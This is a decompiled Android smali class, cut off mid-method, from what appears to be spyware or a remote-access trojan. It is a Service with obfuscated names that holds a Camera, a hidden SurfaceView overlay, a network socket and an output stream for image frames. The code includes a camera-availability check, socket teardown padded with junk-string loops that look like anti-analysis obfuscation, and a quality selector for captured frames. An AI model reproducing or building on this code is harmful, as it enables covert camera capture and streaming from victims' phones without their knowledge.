.class public Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;
.super Landroid/app/Service;
.source "qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12.java"

# interfaces
.implements Landroid/view/SurfaceHolder$Callback;


# static fields
.field public static c_qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_m:Landroid/hardware/Camera;

.field public static la_qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_y:Landroid/view/WindowManager$LayoutParams;

.field public static o_qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_ut:Ljava/io/OutputStream;

.field public static s_qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_fw:Landroid/view/SurfaceView;

.field public static s_qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_k:Ljava/net/Socket;

.field static st:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;

.field private static syc:Ljava/lang/Object;

.field public static w_qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_m:Landroid/view/WindowManager;


# instance fields
.field public Lo:Z

.field private Qulty:I

.field private b_qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_ts:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List<",
            "[B>;"
        }
    .end annotation
.end field

.field public ctd:Z

.field public usd:Z

.field private vul:[Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 46
    new-instance v0, Ljava/lang/Object;

    invoke-direct {v0}, Ljava/lang/Object;-><init>()V

    sput-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->syc:Ljava/lang/Object;

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    .line 37
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    const/4 v0, 0x0

    .line 44
    iput-boolean v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->usd:Z

    iput-boolean v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->ctd:Z

    iput-boolean v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->Lo:Z

    .line 45
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->b_qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_ts:Ljava/util/List;

    const/16 v0, 0x46

    .line 571
    iput v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->Qulty:I

    return-void
.end method

.method static synthetic access$000(Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;)V
    .locals 0

    .line 37
    invoke-direct {p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->di()V

    return-void
.end method

.method static synthetic access$100(Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;)Ljava/util/List;
    .locals 0

    .line 37
    iget-object p0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->b_qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_ts:Ljava/util/List;

    return-object p0
.end method

.method static synthetic access$200()Ljava/lang/Object;
    .locals 1

    .line 37
    sget-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->syc:Ljava/lang/Object;

    return-object v0
.end method

.method static synthetic access$300(Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;)[Ljava/lang/String;
    .locals 0

    .line 37
    iget-object p0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->vul:[Ljava/lang/String;

    return-object p0
.end method

.method static synthetic access$400(Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;)I
    .locals 0

    .line 37
    iget p0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->Qulty:I

    return p0
.end method

.method static synthetic access$402(Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;I)I
    .locals 0

    .line 37
    iput p1, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->Qulty:I

    return p1
.end method

.method static synthetic access$500(Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;II)I
    .locals 0

    .line 37
    invoke-direct {p0, p1, p2}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->q(II)I

    move-result p0

    return p0
.end method

.method private di()V
    .locals 6

    const-string v0, "ask_battary"

    const-string v1, "maxicxtrdtrgcyrzxlkccalqskintcmgocbjhhktxiqrrtfgmlatskejzshvrjkouibqqhvgqrztqyhntdkgdddaqintlfwvlzhgkfgwtgvmjjuvgllqkcyvbtlsllgbxygoowjajnqjmvedzsoqtzybtxorvcsglibwxmgrwidwcmyaxhzmptzwqofnxfyfgtmlizqdybiymfehykwmeftvjvwefisuxihmqhswbmwfytcbnuzcdiszlcsfojijrzfomfhohlsvezmdzbynjivcnbkhvmxmoragarjxawhchnikgkerwsqgnqeebqvijcgiadxjjcybwznlnlzbtmnurtmqzgnqnibdslixngyjyfrbddgbooclnmtbvwhsngkcgfjjziilskzo55"

    const/4 v2, 0x0

    .line 433
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    .line 421
    iput-boolean v2, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->Lo:Z

    .line 422
    sput-boolean v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/qvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71;->FORCA:Z

    const/4 v2, 0x1

    .line 423
    :try_start_0
    sget-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->s_qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_k:Ljava/net/Socket;

    invoke-virtual {v4}, Ljava/net/Socket;->shutdownOutput()V
    :try_end_0
    .catch Ljava/net/SocketException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    goto/16 :goto_8

    .line 490
    :catch_0
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    .line 491
    :goto_0
    invoke-virtual {v4}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v5

    if-eqz v5, :cond_1

    .line 493
    sput-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    .line 494
    sget-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    invoke-virtual {v4, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_0

    .line 496
    sput-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    move-object v4, v3

    goto :goto_0

    .line 503
    :cond_0
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    goto :goto_0

    .line 506
    :cond_1
    :goto_1
    invoke-virtual {v4}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v5

    if-eqz v5, :cond_3

    .line 508
    sput-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    .line 509
    sget-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    invoke-virtual {v4, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_2

    .line 511
    sput-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    move-object v4, v3

    goto :goto_1

    .line 518
    :cond_2
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    goto :goto_1

    .line 521
    :cond_3
    :goto_2
    invoke-virtual {v4}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v5

    if-eqz v5, :cond_5

    .line 523
    sput-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    .line 524
    sget-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    invoke-virtual {v4, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_4

    .line 526
    sput-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    move-object v4, v3

    goto :goto_2

    .line 533
    :cond_4
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    goto :goto_2

    .line 536
    :cond_5
    :goto_3
    invoke-virtual {v4}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v4

    if-eqz v4, :cond_e

    .line 538
    sput-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    .line 539
    sget-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    invoke-virtual {v4, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_6

    .line 541
    sput-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    move-object v4, v3

    goto :goto_3

    .line 548
    :cond_6
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    goto :goto_3

    .line 426
    :catch_1
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    .line 427
    :goto_4
    invoke-virtual {v4}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v5

    if-eqz v5, :cond_8

    .line 429
    sput-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    .line 430
    sget-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    invoke-virtual {v4, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_7

    .line 432
    sput-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    move-object v4, v3

    goto :goto_4

    .line 439
    :cond_7
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    goto :goto_4

    .line 442
    :cond_8
    :goto_5
    invoke-virtual {v4}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v5

    if-eqz v5, :cond_a

    .line 444
    sput-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    .line 445
    sget-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    invoke-virtual {v4, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_9

    .line 447
    sput-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    move-object v4, v3

    goto :goto_5

    .line 454
    :cond_9
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    goto :goto_5

    .line 457
    :cond_a
    :goto_6
    invoke-virtual {v4}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v5

    if-eqz v5, :cond_c

    .line 459
    sput-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    .line 460
    sget-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    invoke-virtual {v4, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_b

    .line 462
    sput-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    move-object v4, v3

    goto :goto_6

    .line 469
    :cond_b
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    goto :goto_6

    .line 472
    :cond_c
    :goto_7
    invoke-virtual {v4}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v4

    if-eqz v4, :cond_e

    .line 474
    sput-object v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    .line 475
    sget-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    invoke-virtual {v4, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_d

    .line 477
    sput-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/ramxpihyrlcpqemyhkiogmmlrxxpudrgvqirvtrptqososiadg11;->T2:Ljava/lang/String;

    move-object v4, v3

    goto :goto_7

    .line 484
    :cond_d
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    goto :goto_7

    .line 552
    :cond_e
    :goto_8
    :try_start_1
    sget-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->s_qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_k:Ljava/net/Socket;

    invoke-virtual {v0}, Ljava/net/Socket;->shutdownInput()V
    :try_end_1
    .catch Ljava/net/SocketException; {:try_start_1 .. :try_end_1} :catch_2
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_2

    .line 553
    :catch_2
    :try_start_2
    sget-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->s_qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_k:Ljava/net/Socket;

    invoke-virtual {v0}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v0

    invoke-virtual {v0}, Ljava/io/OutputStream;->close()V
    :try_end_2
    .catch Ljava/net/SocketException; {:try_start_2 .. :try_end_2} :catch_3
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_3

    .line 554
    :catch_3
    :try_start_3
    sget-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->s_qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_k:Ljava/net/Socket;

    invoke-virtual {v0}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;

    move-result-object v0

    invoke-virtual {v0}, Ljava/io/InputStream;->close()V
    :try_end_3
    .catch Ljava/net/SocketException; {:try_start_3 .. :try_end_3} :catch_4
    .catch Ljava/io/IOException; {:try_start_3 .. :try_end_3} :catch_4

    .line 555
    :catch_4
    :try_start_4
    sget-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->s_qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_k:Ljava/net/Socket;

    invoke-virtual {v0}, Ljava/net/Socket;->close()V
    :try_end_4
    .catch Ljava/net/SocketException; {:try_start_4 .. :try_end_4} :catch_5
    .catch Ljava/io/IOException; {:try_start_4 .. :try_end_4} :catch_5

    goto :goto_9

    :catch_5
    nop

    .line 562
    :goto_9
    sget-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->o_qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_ut:Ljava/io/OutputStream;

    if-eqz v0, :cond_f

    .line 563
    :try_start_5
    invoke-virtual {v0}, Ljava/io/OutputStream;->close()V
    :try_end_5
    .catch Ljava/net/SocketException; {:try_start_5 .. :try_end_5} :catch_6
    .catch Ljava/io/IOException; {:try_start_5 .. :try_end_5} :catch_6

    :catch_6
    const/4 v0, 0x0

    .line 564
    sput-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;->o_qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_ut:Ljava/io/OutputStream;

    :cond_f
    return-void
.end method

.method private q(II)I
    .locals 1

    const v0, 0xf000

    if-le p1, v0, :cond_0

    const/16 p2, 0xf

    goto :goto_0

    :cond_0
    const v0, 0xc800

    if-le p1, v0, :cond_1

    const/16 p2, 0x19

    goto :goto_0

    :cond_1
    const v0, 0xa000

    if-le p1, v0, :cond_2

    const/16 p2, 0x23

    goto :goto_0

    :cond_2
    const/16 v0, 0x7800

    if-le p1, v0, :cond_3

    const/16 p2, 0x2d

    goto :goto_0

    :cond_3
    const/16 v0, 0x5000

    if-le p1, v0, :cond_4

    const/16 p2, 0x41

    goto :goto_0

    :cond_4
    const/16 v0, 0x2800

    if-le p1, v0, :cond_5

    const/16 p2, 0x4b

    :cond_5
    :goto_0
    return p2
.end method


# virtual methods
.method public Completed_qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_App(Ljava/lang/String;I)V
    .locals 2

    .line 202
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12$1;

    invoke-direct {v1, p0, p1, p2}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12$1;-><init>(Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12;Ljava/lang/String;I)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 418
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method public c_qlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12_k()Z
    .locals 1

    .line 191
    :try_start_0
    invoke-static {}, Landroid/hardware/Camera;->open()Landroid/hardware/Camera;

    move-result-object v0
    :try_end_0
    .catch Ljava/lang/RuntimeException; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    if-eqz v0, :cond_0

    .line 196
    invoke-virtual {v0}, Landroid/hardware/Camera;->release()V

    :cond_0
    const/4 v0, 0x0

    return v0

    :catchall_0
    move-exception v0

    .line 198
    throw v0

    :catch_0
    const/4 v0, 0x1

    return v0
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0

    const/4 p1, 0x0

    return-object p1
.end method

.method public onDestroy()V
    .locals 1

    .line 1011
